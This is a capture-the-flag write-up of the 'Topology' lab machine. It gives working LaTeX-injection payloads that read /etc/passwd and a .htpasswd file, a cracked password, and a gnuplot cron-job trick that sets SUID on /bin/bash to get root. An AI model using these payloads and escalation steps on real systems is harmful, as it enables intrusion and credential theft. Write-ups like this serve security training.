### Initial Scan
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 10:12 +0200
Nmap scan report for 10.129.48.189
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
```

### Web Part

After my initial scan, I checked out the standard HTTP port. One of the first things I do, is to look into the web pages source code. Here, I found that some links point to `latex.topology.htb`.
So i added the domains `topology.htb` and `latex.topology.htb` to my `/etc/hosts` file.
Furthermore, I ran `ffuf` to potentially discover more subdomains (VHosts):
```
ffuf -u "http://topology.htb" -H "Host: FUZZ.topology.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://topology.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.topology.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 203ms]
stats                   [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 200ms]
```

I additionally, found 2 more subdomains. 

Since the standard website had nothing of particular interest, I decided to go on to the `latex` subdomain, where I am faced with a directory listing. On `equation.php` there is a LaTex Equation Generator. 

Initially, I was not really sure what to do with this, but I was pretty sure that this is point, which is supposed to be exploited. So, I assumed there might be something like a `LaTex injection`, which I googled, and actually found something in PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection).

Most of these commands were blocked, but not `\lstinputlisting{/etc/passwd}`, although this still only returned a blank .png file. The reason is that the machine asks for Math inline code. We can force the machine to interpreting our query by switching to math mode with $ signs. The working payload was:
```
$\lstinputlisting{/etc/passwd}$
```

Since I earlier discovered the `dev` subdomain, which only has restricted access, I tried to check out, if we can see the credentials for this:
```
$\lstinputlisting{/var/www/dev/.htaccess}$
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

And it worked: We now have a password hash for the user `vdaisley`.
Cracking it with John also revealed the password:
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt         
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)     
1g 0:00:00:03 DONE (2026-08-22 10:55) 0.3144g/s 313358p/s 313358c/s 313358C/s calebd1..bztfriend
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

This password also worked for the ssh login, so we successfully have found the user flag.

### Privilege Escalation

Using standard Privilege Escalation enumeration commands and linpeas, I did not found something particular interesting. So, I also used `pspy`, which helped me to identify a reocurring process. Every minute following command was executed by root:
`/bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;`

This means, that every minute, every file with `.plt` extension in `/opt/gnuplot` gets executed. vdaisley has the rights to write to this directory, so I used following command to set the `SUID` for `/bin/bash`.

```
echo 'system "chmod u+s /bin/bash"' > exploit.plt
```

After waiting a minute, we can just spawn a shell as root:
```
/bin/bash -p
```